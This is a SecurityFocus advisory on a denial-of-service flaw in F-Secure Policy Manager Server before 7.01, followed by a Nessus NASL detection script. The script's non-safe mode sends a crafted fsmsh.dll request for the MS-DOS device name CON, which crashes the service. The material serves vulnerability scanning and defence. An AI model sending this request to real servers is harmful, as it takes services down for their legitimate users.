source: http://www.securityfocus.com/bid/24233/info

F-Secure Policy Manager is prone to a remote denial-of-service vulnerability because the application fails to propelry handle unexpected conditions.

Exploiting this issue allows remote attackers to crash affected applications, denying further service to legitimate users. The vendor states that this application is typically available only to internal networks, making remote exploits over the Internet less likely.

Versions of F-Secure Policy Manager prior to 7.01 are vulnerable. 

#
# This script was written by David Maciejak <david dot maciejak at gmail dot com>
#

if(description)
{
script_id(50000);

script_version("$Revision: 1.0 $");
script_name(english:"F-Secure Policy Manager Server fsmsh.dll module DoS");

desc["english"] = "
Synopsis :

The remote host is an F-Secure Policy Manager Server.

Description :

The remote host is running a version a F-Secure Policy Manager Server which
is vulnerable to a denial of service.
A malicious user can forged a request to query a MS-DOS device name through
fsmsh.dll CGI module causing the service to stop answer to legitimate users.

Solution :

Not available for now.

Risk factor :

High";

script_description(english:desc["english"]);
script_summary(english:"Detects F-Secure Policy Manager DoS flaw");

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2007 David Maciejak");
 script_family(english:"Denial of Service");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0);
if(!get_port_state(port))exit(0);

if (safe_checks())
{
  # only check FSMSH.DLL version
  buf = http_get(item:"/fsms/fsmsh.dll?FSMSCommand=GetVersion", port:port);
  r = http_keepalive_send_recv(port:port, data:buf, bodyonly:1);
  if( r == NULL )exit(0);
  #this could generate false positive on Linux platform
  if ("7.00.7038" >< r ) {
   	 security_hole(port);
  }
  exit(0);  
}

buf = http_get(item:"/fsms/fsmsh.dll?FSMSCommand=DownloadPackage&Type=25&Filename=\install\dbupdate\CON", port:port);
r = http_keepalive_send_recv(port:port, data:buf, bodyonly:1);
buf = http_get(item:"/fsms/fsmsh.dll?FSMSCommand=GetVersion", port:port);
r = http_keepalive_send_recv(port:port, data:buf, bodyonly:1);
if( r == NULL ) { 
	 security_hole(port);
}